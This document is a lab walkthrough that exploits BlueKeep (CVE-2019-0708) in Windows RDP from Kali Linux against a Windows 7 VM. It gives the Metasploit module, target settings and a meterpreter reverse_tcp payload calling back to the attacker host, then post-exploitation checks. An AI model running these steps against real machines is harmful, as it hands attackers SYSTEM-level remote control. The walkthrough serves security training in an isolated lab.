## Intro
BlueKeep (CVE-2019-0708) is a critical security flaw in Microsoft’s Remote Desktop Protocol (RDP) that lets an attacker take full control of a vulnerable Windows computer—without needing a password or user interaction.

## 🔍 What Is RDP?

Remote Desktop Protocol (RDP) is a Microsoft protocol that allows users to remotely control another computer over a network. It’s commonly used by IT administrators for remote support or access.

RDP typically runs on TCP port 3389.


## How it works:
The attacker sends a malformed RDP request that exploits a memory handling error (use-after-free) in the Windows RDP service. This lets them run arbitrary code as SYSTEM (highest privilege)—all before logging in.
**Why it’s dangerous**: It’s wormable—can spread automatically across networks like WannaCry.

## To perform RDP exploitation using the BlueKeep vulnerability (CVE-2019-0708) on your Windows 7 VM (192.168.56.103) from Kali Linux (192.168.56.106), follow this step-by-step 

### Prerequisites
### Target: 
Windows 7 SP1 (unpatched, RDP enabled)
```
    Ensure RDP is enabled:
    Control Panel > System > Remote Settings > Allow Remote Assistance connections
```
### Attacker:
Kali Linux (192.168.56.106)
Both VMs must be on the same network (e.g., Host-only or Bridged in VirtualBox)

Confirm RDP is listening on target:
nmap -p 3389 --script rdpsig 192.168.56.103


### 1. Open Metasploit Console
msfconsole

### 2.Select the Exploit 

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

### 3. Set Target Options

set RHOSTS 192.168.56.103
set RPORT 3389
set TARGET 2

To confirm the correct target ID: type ---

show targets

### 4.Choose a Payload

set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.106   # Your Kali IP
set LPORT 4555             # Use a NEW port (not used by other handlers)

### (Optional) Tune Exploit Stability

BlueKeep can be unstable. To reduce crash risk:
set VERBOSE true
set CHECK_SUPPORTED true   # Verify target is vulnerable first


### 5.Run the Exploit
Exploit

### 6. Verify Success

If successful, you’ll get a Meterpreter session:
meterpreter > sysinfo

Check privileges:
meterpreter > getuid
